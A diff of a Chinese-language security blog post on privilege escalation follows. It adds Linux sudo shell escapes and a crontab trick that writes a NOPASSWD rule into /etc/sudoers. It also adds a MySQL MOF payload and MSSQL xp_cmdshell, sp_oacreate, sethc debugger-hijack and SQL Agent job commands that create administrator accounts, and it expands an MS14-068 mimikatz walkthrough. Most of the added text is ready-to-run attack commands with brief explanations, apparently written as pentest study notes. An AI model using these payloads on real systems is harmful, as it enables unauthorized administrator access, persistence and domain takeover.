@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.4k</span>
+            <span class="post-count">2.5k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">6 min</span>
+            <span class="post-count">11 min</span>
         </span>
     </span>
 </div>
@@ -151,6 +151,7 @@
 <ol start="2">
 <li>RPC 135端口是否开启</li>
 </ol>
+<h3 id="其他tips："><a href="#其他tips：" class="headerlink" title="其他tips："></a>其他tips：</h3><p>（CVE-2022-29072）7zip漏洞 提权</p>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg">https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw">https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw</a></p>
@@ -190,7 +191,31 @@
 
 
 
-<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p>
+<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>知道账户密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br><span class="line"></span><br><span class="line">sudo python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>漏洞</p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>crontab提权</p>
+<ol>
+<li>编辑/etc/crontab，设置每隔1分钟执行一次sh脚本</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * root sh &#x2F;home&#x2F;test&#x2F;test.sh &gt;&gt; &#x2F;tmp&#x2F;test.txt</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>如果test用户有权限操作test.sh，则存在提权漏洞。下面使用test用户修改test.sh：将test用户加入sudoers</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv test.sh test.sh.bak</span><br><span class="line"></span><br><span class="line">vim test.sh                                                               echo &quot;test ALL&#x3D;(root) NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>等待1分钟后，成功提权</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p>
 <h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><p>原理：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</span><br></pre></td></tr></table></figure>
 
@@ -240,16 +265,84 @@
 
 <p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/65.png"></p>
 <p>成功获取system权限</p>
-<h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><h1 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h1><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">EXEC xp_cmdshell &#39;whoami&#39;;</span><br></pre></td></tr></table></figure>
+<h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><p>原理：</p>
+<p>对c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件  具有读写权限，在nullevt.mof  中可以构造恶意vbs脚本（特性是每隔一段时间执行一次）进行命令执行 </p>
+<p>条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv参数不为null</span><br><span class="line">mysql启动身份具有权限去读写 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</span><br><span class="line">windows 03及以下版本</span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前提条件：</span><br><span class="line"></span><br><span class="line">域控没有打该漏洞补丁(KB3011780)</span><br><span class="line"></span><br><span class="line">已经获取普通域用户的账户，密码，hash，sid（whoami &#x2F;user）</span><br></pre></td></tr></table></figure>
+<p>公开nullevt.mof 代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user shmily 123456 &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line"></span><br><span class="line">1.mimikatz清除票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">2.ms14-068.exe生成票据</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr(ip)&gt;</span><br><span class="line"></span><br><span class="line">3.mumukatz导入票据，权限提升为域管</span><br><span class="line">kerberos::ptc &quot;票据文件名&quot;</span><br></pre></td></tr></table></figure>
+<p>导入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;upload&#x2F;1.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
 
+
+
+<h1 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h1><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p><code>xp_cmdshell</code>在<code>mssql2000</code>中是默认开启的，不过在<code>mssql2005</code>之后的版本中则是默认关闭的。</p>
+<p>查询xp_cmdshell是否存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*)from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39; ;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>启用<code>xp_cmdshell</code>命令  ，需要管理员SA权限，否在不能启动。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user shmily 123. &#x2F;add&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>xp_cmdshell被删除时候，sp_oacreate默认被禁止，需要开启。<code>sp_oacreate</code>在 <code>SQL Server</code>实例上创建<code>OLE</code>对象实例。</p>
+<p>恢复sp_oacreate</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure>
+
+<p>命令执行   -&gt;输出到c:\1.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\\1.txt&#39;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h3><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.</p>
+<p><a target="_blank" rel="noopener" href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p>
+<h3 id="镜像劫持提权"><a href="#镜像劫持提权" class="headerlink" title="镜像劫持提权"></a>镜像劫持提权</h3><p>通过regwrite函数修改注册表进行，regwrite需要开启</p>
+<p>参考上面开启Ad Hoc Distributed，并恢复regwrite</p>
+<p>劫持</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_regwrite @rootkey&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;,@key&#x3D;&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#39;,@value_name&#x3D;&#39;Debugger&#39;,@type&#x3D;&#39;REG_SZ&#39;,@value&#x3D;&#39;c:\windows\system32\cmd.exe&#39;</span><br></pre></td></tr></table></figure>
+
+<p>查看Debugger 是否为cmd路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;Debugger&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后远程桌面，五次shift</p>
+<h3 id="JOB提权"><a href="#JOB提权" class="headerlink" title="JOB提权"></a>JOB提权</h3><p>创建任务X，执行命令，返回结果</p>
+<p>启动sqlagent服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_servicecontrol &#39;start&#39;,&#39;SQLSERVERAGENT&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建任务x，执行添加账户的命令，然后将命令返回结果输出到<code>q.txt</code>中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use msdb</span><br><span class="line">exec sp_delete_job null,&#39;x&#39;</span><br><span class="line">exec sp_add_job &#39;x&#39;</span><br><span class="line">exec sp_add_jobstep null,&#39;x&#39;,null,&#39;1&#39;,&#39;cmdexec&#39;,&#39;cmd &#x2F;c &quot;net user test test &#x2F;add &amp;net localgroup administrators test &#x2F;add&gt;c:&#x2F;q.txt&quot;&#39;</span><br><span class="line">exec sp_add_jobserver null,&#39;x&#39;,@@servername</span><br><span class="line">exec sp_start_job &#39;x&#39;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p>
+<h1 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>原理：PAC问题</p>
+<p>用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。</p>
+<p>如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。</p>
+<p>将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前提条件：</span><br><span class="line"></span><br><span class="line">域控没有打该漏洞补丁(KB3011780)</span><br><span class="line"></span><br><span class="line">已经获取普通域用户的账户，密码，hash，sid（whoami &#x2F;user）</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line"></span><br><span class="line">1.mimikatz清除票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">2.ms14-068.exe生成票据</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr(ip)&gt;</span><br><span class="line"></span><br><span class="line">-u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip</span><br><span class="line"></span><br><span class="line">3.mumukatz导入票据，权限提升为域管</span><br><span class="line">kerberos::ptc &quot;票据文件名&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2021-42287-CVE-2021-42278"><a href="#CVE-2021-42287-CVE-2021-42278" class="headerlink" title="CVE-2021-42287/CVE-2021-42278"></a>CVE-2021-42287/CVE-2021-42278</h3><p>即saMAccountName spoofing漏洞，仅有一个普通域账号的场景下，利用该漏洞接管全域。</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/317773.html">域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户</a></p>
  
       <!-- reward -->
       
